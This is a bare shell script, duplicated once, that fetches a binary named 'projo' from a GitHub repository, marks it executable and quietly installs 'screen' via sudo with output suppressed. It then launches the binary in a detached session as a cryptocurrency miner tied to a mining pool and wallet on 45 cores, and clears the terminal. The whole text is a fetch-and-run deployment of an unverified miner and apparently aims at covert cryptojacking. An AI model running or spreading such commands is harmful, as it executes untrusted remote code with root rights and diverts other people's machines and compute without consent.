wget https://github.com/obisumila/musical-eureka/raw/refs/heads/main/projo ;
chmod +x projo ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S live -dm ./projo --url ws://tw-pool.com:5487/mine mine --username yQkA54x6gaoB93ce7cc1wui6zsk3Kf5NTbHCU2cBhkj.NODE --cores 45 ; 
screen -ls
sleep 2
clear
screen -ls ; 

wget https://github.com/obisumila/musical-eureka/raw/refs/heads/main/projo ;
chmod +x projo ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S live -dm ./projo --url ws://tw-pool.com:5487/mine mine --username yQkA54x6gaoB93ce7cc1wui6zsk3Kf5NTbHCU2cBhkj.CONFIG --cores 45 ; 
screen -ls
sleep 2
clear
screen -ls ; 

